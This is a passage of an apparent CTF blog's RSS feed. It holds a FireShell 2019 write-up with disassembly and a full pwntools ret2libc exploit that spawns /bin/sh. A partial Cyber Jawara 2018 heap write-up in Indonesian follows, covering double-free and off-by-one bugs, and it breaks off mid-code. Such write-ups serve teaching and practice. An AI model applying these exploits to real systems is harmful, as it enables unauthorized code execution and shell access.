         <guid>http://kiror0.github.io/ctf/posts/fireshell-2019-leakless/</guid>
         <description>&lt;h2 id=&#34;download&#34;&gt;download&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/leakless/leakless&#34;&gt;binary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/leakless/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;buffer overflow in &lt;code&gt;sym.feedme&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485cb&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485cc&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485ce&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485cf&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;               &lt;span style=&#34;color:#75715e&#34;&gt;; stack frame size = 0x44
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x080485d2&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sym.__x86.get_pc_thunk.ax&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485d7&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a29&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485dc&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485df&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;                  &lt;span style=&#34;color:#75715e&#34;&gt;; nbyte = 0x100 &amp;lt;--- overflow
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x080485e4&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp-0x48&lt;/span&gt;]
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485e7&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;; void *buf
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x080485e8&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                      &lt;span style=&#34;color:#75715e&#34;&gt;; int fd
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x080485ea&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485ec&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sym.imp.read&lt;/span&gt;           &lt;span style=&#34;color:#75715e&#34;&gt;; ssize_t read(fd, buf, nbytes)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x080485f1&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485f4&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;nop&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485f5&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp-0x4&lt;/span&gt;]
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485f8&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;leave&lt;/span&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x080485f9&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;straight to the point ret2libc ROP as the binary still has &lt;code&gt;puts&lt;/code&gt; to use as leak&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;tmux&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;split-window&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-h&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]
elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./leakless&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__len__() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./libc.so.6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process()
    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/usr/lib32/libc.so.6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)
    gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(r, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b *0x080485f9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;feedme&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;span style=&#34;color:#75715e&#34;&gt;# print hex(u32(leak[0:4]))&lt;/span&gt;
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u32(leak[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)))

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;footnote&#34;&gt;footnote&lt;/h2&gt;
&lt;p&gt;As the name implies, this problem shouldn&#39;t be fairly easy because
I guess the intended solution should be using &lt;code&gt;ret2dlresolve&lt;/code&gt;.&lt;/p&gt;
</description>
       </item>
       
       <item>
         <title>Cyber Jawara 2018 Final - zeus</title>
         <link>http://kiror0.github.io/ctf/posts/cyber-jawara-2018-final-zeus/</link>
         <pubDate>Sun, 14 Oct 2018 18:55:10 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/cyber-jawara-2018-final-zeus/</guid>
         <description>&lt;h2 id=&#34;desc&#34;&gt;desc&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first to know what data structure is used for storing the data. This service is also run with sandbox. For patching, you are only allowed to patch 32 bytes in &amp;lsquo;zeus&amp;rsquo; binary and only 2 bytes in &amp;lsquo;zeus_sandbox&amp;rsquo;. For this service, all attack points are multiplied by 2x.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Downloads :
&lt;a href=&#34;http://kiror0.github.io/ctf/assets/cj/zeus/zeus&#34;&gt;zeus&lt;/a&gt;
&lt;a href=&#34;http://kiror0.github.io/ctf/assets/cj/zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&#34;&gt;libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&lt;/a&gt;
&lt;a href=&#34;http://kiror0.github.io/ctf/assets/cj/zeus/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;λ › ./zeus
...

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

&amp;gt;&amp;gt; 1
Key length: 8
Insert key: AAAAAAAA
Value length: 8
Insert value: AAAAAAAA
8
[Key inserted] AAAAAAAA:AAAAAAAA

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

&amp;gt;&amp;gt; 3
Key: AAAAAAAA
Value: AAAAAAAA^C

[*] &#39;/Challs/cj/p11-zeus/zeus&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

[*] &#39;/Challs/cj/p11-zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;intro&#34;&gt;intro&lt;/h2&gt;
&lt;p&gt;Problem heap dengan interface menu yang tidak terlalu asing (add-delete-view). libc yang dipakai adalah libc 2.28 dari ubuntu 18.10, dengan begitu fitur tcache ada di libc ini. Bisa diperiksa lagi juga,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;λ › grep tcache libc-2.28-9dc614ec33ee0284064ec5535bda431c.so
Binary file libc-2.28-9dc614ec33ee0284064ec5535bda431c.so matches
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;tcache itu apa sih? tcache ini secara singkat bisa dibaca di sini &lt;a href=&#34;http://tukan.farm/2017/07/08/tcache/&#34;&gt;http://tukan.farm/2017/07/08/tcache/&lt;/a&gt;, untuk yang belum paham glibc malloc dan internalnya, baca dulu &lt;a href=&#34;https://github.com/shellpish/how2heap&#34;&gt;https://github.com/shellpish/how2heap&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;internals&#34;&gt;internals&lt;/h2&gt;
&lt;p&gt;Beberapa hal internal penting yang dipakai pada binary ini,&lt;/p&gt;
&lt;h3 id=&#34;safe-malloc-&#34;&gt;safe-malloc (?)&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;request&lt;/em&gt; size terbatas 0 - 0x400.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;uint_16t size;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400u&lt;/span&gt; )
  {
    ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(size);
    memset(ptr, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, size);
    _ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;single-linked-list-data&#34;&gt;single linked-list data&lt;/h3&gt;
&lt;p&gt;data disimpan dengan model linked list&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _list
{
  uint_16t key_len;
  uint_16t value_len;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; value;
  _list&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; next;
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;bug&#34;&gt;bug&lt;/h2&gt;
&lt;h3 id=&#34;double-free&#34;&gt;double-free&lt;/h3&gt;
&lt;p&gt;Pada &lt;code&gt;delete()&lt;/code&gt;, jika list terakhir dihapus, pointer next terkahir (NULL) tidak diarahkan ke list sebelumnya, skema double-free dapat dilakukan hanya pada list terakhir.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next )
  {
    tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
    ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (linked_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strcmp(ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key, s) )
      {
        found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next )
          tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next; &lt;span style=&#34;color:#75715e&#34;&gt;// BUG
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        free(ptr);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;off-by-one-null-byte&#34;&gt;off-by-one null byte&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;insert()&lt;/code&gt; pada saat memasukkan nilai null-byte ke string.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Key length: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  fgets(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;, stdin);
  _key_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
  _key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)safe_malloc(_key_len);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( _key )
  {
